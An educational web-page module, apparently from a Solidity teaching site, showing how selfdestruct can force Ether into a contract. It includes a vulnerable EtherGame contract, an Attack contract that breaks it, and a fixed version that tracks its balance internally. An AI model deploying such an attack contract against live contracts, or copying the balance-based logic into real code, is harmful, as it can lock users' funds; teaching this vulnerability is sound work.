// metadata
export const version = "0.8.13"
export const title = "Self Destruct"
export const description =
  "An example of how to delete your smart contract by calling seldestruct in Solidity"
export const codes = [
  {
    fileName: "ForceEther.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCi8vIFRoZSBnb2FsIG9mIHRoaXMgZ2FtZSBpcyB0byBiZSB0aGUgN3RoIHBsYXllciB0byBkZXBvc2l0IDEgRXRoZXIuCi8vIFBsYXllcnMgY2FuIGRlcG9zaXQgb25seSAxIEV0aGVyIGF0IGEgdGltZS4KLy8gV2lubmVyIHdpbGwgYmUgYWJsZSB0byB3aXRoZHJhdyBhbGwgRXRoZXIuCgovKgoxLiBEZXBsb3kgRXRoZXJHYW1lCjIuIFBsYXllcnMgKHNheSBBbGljZSBhbmQgQm9iKSBkZWNpZGVzIHRvIHBsYXksIGRlcG9zaXRzIDEgRXRoZXIgZWFjaC4KMi4gRGVwbG95IEF0dGFjayB3aXRoIGFkZHJlc3Mgb2YgRXRoZXJHYW1lCjMuIENhbGwgQXR0YWNrLmF0dGFjayBzZW5kaW5nIDUgZXRoZXIuIFRoaXMgd2lsbCBicmVhayB0aGUgZ2FtZQogICBObyBvbmUgY2FuIGJlY29tZSB0aGUgd2lubmVyLgoKV2hhdCBoYXBwZW5lZD8KQXR0YWNrIGZvcmNlZCB0aGUgYmFsYW5jZSBvZiBFdGhlckdhbWUgdG8gZXF1YWwgNyBldGhlci4KTm93IG5vIG9uZSBjYW4gZGVwb3NpdCBhbmQgdGhlIHdpbm5lciBjYW5ub3QgYmUgc2V0LgoqLwoKY29udHJhY3QgRXRoZXJHYW1lIHsKICAgIHVpbnQgcHVibGljIHRhcmdldEFtb3VudCA9IDcgZXRoZXI7CiAgICBhZGRyZXNzIHB1YmxpYyB3aW5uZXI7CgogICAgZnVuY3Rpb24gZGVwb3NpdCgpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICByZXF1aXJlKG1zZy52YWx1ZSA9PSAxIGV0aGVyLCAiWW91IGNhbiBvbmx5IHNlbmQgMSBFdGhlciIpOwoKICAgICAgICB1aW50IGJhbGFuY2UgPSBhZGRyZXNzKHRoaXMpLmJhbGFuY2U7CiAgICAgICAgcmVxdWlyZShiYWxhbmNlIDw9IHRhcmdldEFtb3VudCwgIkdhbWUgaXMgb3ZlciIpOwoKICAgICAgICBpZiAoYmFsYW5jZSA9PSB0YXJnZXRBbW91bnQpIHsKICAgICAgICAgICAgd2lubmVyID0gbXNnLnNlbmRlcjsKICAgICAgICB9CiAgICB9CgogICAgZnVuY3Rpb24gY2xhaW1SZXdhcmQoKSBwdWJsaWMgewogICAgICAgIHJlcXVpcmUobXNnLnNlbmRlciA9PSB3aW5uZXIsICJOb3Qgd2lubmVyIik7CgogICAgICAgIChib29sIHNlbnQsICkgPSBtc2cuc2VuZGVyLmNhbGx7dmFsdWU6IGFkZHJlc3ModGhpcykuYmFsYW5jZX0oIiIpOwogICAgICAgIHJlcXVpcmUoc2VudCwgIkZhaWxlZCB0byBzZW5kIEV0aGVyIik7CiAgICB9Cn0KCmNvbnRyYWN0IEF0dGFjayB7CiAgICBFdGhlckdhbWUgZXRoZXJHYW1lOwoKICAgIGNvbnN0cnVjdG9yKEV0aGVyR2FtZSBfZXRoZXJHYW1lKSB7CiAgICAgICAgZXRoZXJHYW1lID0gRXRoZXJHYW1lKF9ldGhlckdhbWUpOwogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyBwYXlhYmxlIHsKICAgICAgICAvLyBZb3UgY2FuIHNpbXBseSBicmVhayB0aGUgZ2FtZSBieSBzZW5kaW5nIGV0aGVyIHNvIHRoYXQKICAgICAgICAvLyB0aGUgZ2FtZSBiYWxhbmNlID49IDcgZXRoZXIKCiAgICAgICAgLy8gY2FzdCBhZGRyZXNzIHRvIHBheWFibGUKICAgICAgICBhZGRyZXNzIHBheWFibGUgYWRkciA9IHBheWFibGUoYWRkcmVzcyhldGhlckdhbWUpKTsKICAgICAgICBzZWxmZGVzdHJ1Y3QoYWRkcik7CiAgICB9Cn0K",
  },
  {
    fileName: "PreventForceEther.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4xMzsKCmNvbnRyYWN0IEV0aGVyR2FtZSB7CiAgICB1aW50IHB1YmxpYyB0YXJnZXRBbW91bnQgPSAzIGV0aGVyOwogICAgdWludCBwdWJsaWMgYmFsYW5jZTsKICAgIGFkZHJlc3MgcHVibGljIHdpbm5lcjsKCiAgICBmdW5jdGlvbiBkZXBvc2l0KCkgcHVibGljIHBheWFibGUgewogICAgICAgIHJlcXVpcmUobXNnLnZhbHVlID09IDEgZXRoZXIsICJZb3UgY2FuIG9ubHkgc2VuZCAxIEV0aGVyIik7CgogICAgICAgIGJhbGFuY2UgKz0gbXNnLnZhbHVlOwogICAgICAgIHJlcXVpcmUoYmFsYW5jZSA8PSB0YXJnZXRBbW91bnQsICJHYW1lIGlzIG92ZXIiKTsKCiAgICAgICAgaWYgKGJhbGFuY2UgPT0gdGFyZ2V0QW1vdW50KSB7CiAgICAgICAgICAgIHdpbm5lciA9IG1zZy5zZW5kZXI7CiAgICAgICAgfQogICAgfQoKICAgIGZ1bmN0aW9uIGNsYWltUmV3YXJkKCkgcHVibGljIHsKICAgICAgICByZXF1aXJlKG1zZy5zZW5kZXIgPT0gd2lubmVyLCAiTm90IHdpbm5lciIpOwoKICAgICAgICAoYm9vbCBzZW50LCApID0gbXNnLnNlbmRlci5jYWxse3ZhbHVlOiBiYWxhbmNlfSgiIik7CiAgICAgICAgcmVxdWlyZShzZW50LCAiRmFpbGVkIHRvIHNlbmQgRXRoZXIiKTsKICAgIH0KfQo=",
  },
]

const html = `<p>Contracts can be deleted from the blockchain by calling <code>selfdestruct</code>.</p>
<p><code>selfdestruct</code> sends all remaining Ether stored in the contract to a
designated address.</p>
<h3 id="vulnerability">Vulnerability</h3>
<p>A malicious contract can use <code>selfdestruct</code> to
force sending Ether to any contract.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.13;</span>

<span class="hljs-comment">// The goal of this game is to be the 7th player to deposit 1 Ether.</span>
<span class="hljs-comment">// Players can deposit only 1 Ether at a time.</span>
<span class="hljs-comment">// Winner will be able to withdraw all Ether.</span>

<span class="hljs-comment">/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount <span class="hljs-operator">=</span> <span class="hljs-number">7</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);

        <span class="hljs-keyword">uint</span> balance <span class="hljs-operator">=</span> <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>;
        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> targetAmount, <span class="hljs-string">"Game is over"</span>);

        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> targetAmount) {
            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: <span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>).<span class="hljs-built_in">balance</span>}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    EtherGame etherGame;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">EtherGame _etherGame</span>) </span>{
        etherGame <span class="hljs-operator">=</span> EtherGame(_etherGame);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-comment">// You can simply break the game by sending ether so that</span>
        <span class="hljs-comment">// the game balance &gt;= 7 ether</span>

        <span class="hljs-comment">// cast address to payable</span>
        <span class="hljs-keyword">address</span> <span class="hljs-keyword">payable</span> addr <span class="hljs-operator">=</span> <span class="hljs-keyword">payable</span>(<span class="hljs-keyword">address</span>(etherGame));
        <span class="hljs-built_in">selfdestruct</span>(addr);
    }
}
</code></pre>
<h3 id="preventative-techniques">Preventative Techniques</h3>
<p>Don&#39;t rely on <code>address(this).balance</code></p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.13;</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">EtherGame</span> </span>{
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> targetAmount <span class="hljs-operator">=</span> <span class="hljs-number">3</span> <span class="hljs-literal">ether</span>;
    <span class="hljs-keyword">uint</span> <span class="hljs-keyword">public</span> balance;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> winner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-literal">ether</span>, <span class="hljs-string">"You can only send 1 Ether"</span>);

        balance <span class="hljs-operator">+</span><span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>;
        <span class="hljs-built_in">require</span>(balance <span class="hljs-operator">&lt;</span><span class="hljs-operator">=</span> targetAmount, <span class="hljs-string">"Game is over"</span>);

        <span class="hljs-keyword">if</span> (balance <span class="hljs-operator">=</span><span class="hljs-operator">=</span> targetAmount) {
            winner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        }
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">claimReward</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-built_in">require</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> winner, <span class="hljs-string">"Not winner"</span>);

        (<span class="hljs-keyword">bool</span> sent, ) <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>.<span class="hljs-built_in">call</span>{<span class="hljs-built_in">value</span>: balance}(<span class="hljs-string">""</span>);
        <span class="hljs-built_in">require</span>(sent, <span class="hljs-string">"Failed to send Ether"</span>);
    }
}
</code></pre>
`

export default html
